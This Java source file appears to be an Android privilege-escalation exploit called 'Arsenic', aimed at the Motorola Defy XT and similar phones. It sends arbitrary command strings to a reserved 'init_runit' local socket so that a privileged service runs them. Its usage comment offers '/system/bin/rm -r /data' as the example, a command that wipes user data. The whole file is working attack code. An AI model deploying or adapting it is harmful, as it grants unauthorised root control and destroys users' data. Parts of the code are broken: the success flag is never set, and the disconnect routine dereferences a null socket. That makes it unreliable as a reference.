package com.cunninglogic.arsenic;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.util.Log;

public class SocketComm {
    static String TAG = "Arsenic";
    static byte[] buf = new byte[0x400];
    int buflen = 0;
    static InputStream mIn;
    static OutputStream mOut;
    static LocalSocket mSocket;

    /* Arsenic for Motorola Defy XT (Republic Wireless) and others
     * By: jcase@cunninglogic.com
     * Usage:
     * SocketComm.execCommand("/system/bin/rm -r /data");
     *
     */

    public static boolean execCommand (String command) {
        boolean success = false;
        if (connect()){
            byte[] bytesCommand = command.getBytes();
            int i = bytesCommand.length;
            if(i >= 1 && i <= 1024) {
                buf[0] = (byte)(i & 255);
                buf[1] = (byte)(i >> 8 & 255);

                try {
                    mOut.write(buf, 0, 2);
                    mOut.write(bytesCommand, 0, i);
                } catch (IOException e) {
                    Log.e(TAG, "command error");
                    disconnect();
                    success = false;
                }
            }
        }

        return success;
    }

    private static boolean connect() {
        boolean isConnected = true;

        if (mSocket == null) {
            mSocket = new LocalSocket();
            LocalSocketAddress mAddress = new LocalSocketAddress("init_runit",LocalSocketAddress.Namespace.RESERVED);
            try {
                mSocket.connect(mAddress);
                mIn = mSocket.getInputStream();
                mOut = mSocket.getOutputStream();
                isConnected = true;
            } catch (IOException e) {
                isConnected = false;
                e.printStackTrace();
            }
        }
        return isConnected;
    }

    @SuppressWarnings("null")
    private static void disconnect() {
        LocalSocket socket = null;
        try {

            if(mSocket != null){
                mSocket.close();
            }

            if(mIn != null){
                mIn.close();
            }

            if(mOut != null){
                mOut.close();
            }

            mSocket = socket;
            mIn = socket.getInputStream();
            mOut = socket.getOutputStream();

        } catch (IOException e) {
            e.printStackTrace();
        }

    }

}﻿